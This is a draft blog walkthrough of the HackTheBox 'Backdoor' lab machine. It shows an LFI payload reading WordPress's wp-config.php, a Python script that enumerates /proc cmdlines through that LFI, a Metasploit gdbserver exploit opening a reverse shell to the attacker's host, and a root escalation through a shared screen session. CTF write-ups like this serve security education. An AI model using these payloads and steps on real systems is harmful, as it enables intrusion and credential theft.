---
title: "HackTheBox: \"Backdoor\" Walkthrough"
date: 2022-04-24T19:56:04+02:00
tags: []
slug: "hackthebox-backdoor-walkthrough"
draft: true
---

# Introduction

The now retired *Backdoor* machine on HackTheBox is supposed to be an "easy" machine, so
it should be absolutely straight-forward. Let's see!

# Foothold

On this machine, I started with a directory scan, using the `fuzz-Bo0oM.txt` list, which
usually yields good results - at least on HackTheBox. We'll notice that directory
listing is enabled almost everywhere, so we can also explore manually.

In the end, we'll find a pretty standard WordPress installation with a
single plugin called "ebook-download" enabled - for which we will find a LFI vuln pretty quick:

```plain
.../filedownload.php?ebookdownloadurl=../../../wp-config.php
```

Neat - we can download the WordPress configuration, containing credentials for the database.
But it seems we can't do anything with the credentials for the database server.

Let's continue with a port scan:
```plain
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
|_http-generator: WordPress 5.8.1
1337/tcp open  waste?
```
Of course, `1337/tcp` stands out. But what kind of service is running there?
We can try a few simple things: Try to open it in a browser, try to SSH and as last resort,
try telnet. Sadly, none of that works.

Now, the next step took me a while: Using Linux, we can read `/proc/<pid>/cmdline`
to get information about a running process, so we might be able to find
the process which has opened port 1337. We only need to know the PID - which we don't.
So let's use the LFI we found earlier to scan a range of PIDs.

To be honest, this script could have been *a lot* easier - but somehow I got the idea
"I want to scan faster - I need multiple connections", so I ended up with this.
Maybe I'm able to use it again in the future :wink:

(*Disclaimer: I'm not an async Python expert, so forgive me (or maybe even tell me)
if there is a bad mistake.*)

```python
import asyncio
import aiohttp
from aiohttp import ClientSession, ClientConnectorError

# https://stackoverflow.com/a/61478547
async def gather_with_concurrency(n, *tasks):
    semaphore = asyncio.Semaphore(n)

    async def sem_task(task):
        async with semaphore:
            return await task
    return await asyncio.gather(*(sem_task(task) for task in tasks))

async def fetch_html(url: str, session: ClientSession, **kwargs) -> tuple:
    try:
        resp = await session.request(method="GET", url=url, **kwargs)
    except ClientConnectorError:
        return (url, 404, "")
    return (url, resp.status, await resp.text())

async def make_requests(urls: set, **kwargs) -> None:
    async with ClientSession() as session:
        tasks = []
        for url in urls:
            tasks.append(
                fetch_html(url=url, session=session, **kwargs)
            )
        results = await gather_with_concurrency(10, *tasks)

    for result in results:
        print(f'{str(result[2])}')

if __name__ == "__main__":
    urls = [(
            f"http://10.10.11.125/wp-content/plugins/ebook-download/"
            f"filedownload.php?ebookdownloadurl=/proc/{i}/cmdline"
        ) for i in range(10000)]

    asyncio.run(make_requests(urls=urls))
```

This scan yields (with some garbage removed in the beginning and end,
due to the way the download script works):
```plain
suuser-ccd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
bash-ccd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
gdbserver--once0.0.0.0:1337/bin/true
```

Finally! On port 1337 there seems to be a `gdbserver` running. That seems
pretty unusual but why not - let's see what we can do with this.

# User

After some research, we find the `exploit/multi/gdb/gdb_server_exec` payload
in metasploit. I used the following configuration, where everything should be
pretty self-explanatory, except for `set target 1`: 0 is x86, 1 is x86_64.
Using the wrong architecture, running the exploit will fail with the message:

> The payload architecture is incorrect: the payload is x86, but x64 was detected from gdb.

```plain
msf6 > use exploit/multi/gdb/gdb_server_exec
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/gdb/gdb_server_exec) > set LHOST 10.10.14.5
LHOST => 10.10.14.5
msf6 exploit(multi/gdb/gdb_server_exec) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/gdb/gdb_server_exec) > set RHOSTS 10.10.11.125
RHOSTS => 10.10.11.125
msf6 exploit(multi/gdb/gdb_server_exec) > set RPORT 1337
RPORT => 1337
msf6 exploit(multi/gdb/gdb_server_exec) > set target 1
target => 1
msf6 exploit(multi/gdb/gdb_server_exec) > set payload payload/linux/x64/shell/reverse_tcp
payload => linux/x64/shell/reverse_tcp
msf6 exploit(multi/gdb/gdb_server_exec) > run

[*] Started reverse TCP handler on 10.10.14.5:4444
[*] 10.10.11.125:1337 - Performing handshake with gdbserver...
[*] 10.10.11.125:1337 - Stepping program to find PC...
[*] 10.10.11.125:1337 - Writing payload at 00007ffff7fd0103...
[*] 10.10.11.125:1337 - Executing the payload...
[*] Sending stage (38 bytes) to 10.10.11.125
[*] Command shell session 2 opened (10.10.14.5:4444 -> 10.10.11.125:54214 ) at 2022-04-24 15:15:56 -0400

id
uid=1000(user) gid=1000(user) groups=1000(user)

```

Done! :thumbsup:

# Root

For privilege escalation, I'm going to ask LinPEAS for an idea. Under the section
"Unix Sockets Listening" there is an unusual entry: `/run/screen/S-root/964.root`.

So there seems to be a screen session running. We cannot directly access this socket file:
```plain
drwx------  2 root root  60 Apr 24 18:13 S-root
```
But as this is an "easy" machine, there are no false trails - so it's highly likely
that we *must* do something with the `screen` command.

As I had literally no idea what do to, I Googled *"access root screen session as user"*
(or something similar - didn't write down the exact search term :wink:), which
lead to [this post](https://unix.stackexchange.com/a/163878). The interesting part being:
```plain
screen -x host_username/session_name
```
We know the username is `root` and the session name is also `root`, so let's try
```plain
screen -x root/root
```
... and we will find ourselves in a screen session with a root shell!

NB: Using a non-upgraded reverse shell, this command fails with the message:

> Must be connected to a terminal.

# Conclusion and Learnings

Although this is an "easy" machine, I struggled a bit after finding the LFI.
Enumerating the processes using `/proc` was something I didn't think off right away.
I spent way too much time on the Python script, but also learned a bit while writing it.
Also, I learned that just because a socket is not readable does not mean I can't do
anything with it. Finally, I learned about screen multi-user mode.

All in all:
I had some fun with this machine, despite the setup not looking very realistic
(except for the LFI).